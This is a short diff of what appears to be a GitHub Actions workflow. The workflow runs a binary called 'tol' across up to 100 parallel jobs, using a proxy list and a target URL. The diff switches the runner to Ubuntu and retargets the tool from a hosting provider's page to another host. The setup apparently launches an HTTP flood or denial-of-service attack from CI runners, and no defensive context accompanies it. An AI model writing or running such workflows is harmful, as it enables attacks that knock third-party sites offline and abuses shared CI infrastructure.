@@ -9,7 +9,7 @@ on:
 
 jobs:
   parallel-execution-ubuntu:
-    runs-on: windows-latest
+    runs-on: ubuntu-latest
     strategy:
       max-parallel: 100
       fail-fast: false  # Continue even if some instances fail
@@ -35,7 +35,7 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           chmod +x tol
           
-          ./tol https://datalix.eu/rent-amd-ryzen-dedicated-server 200 1 1  90.txt
+          ./tol http://massive-dn-1.backroom.services 200 1 1  90.txt
           
           
           
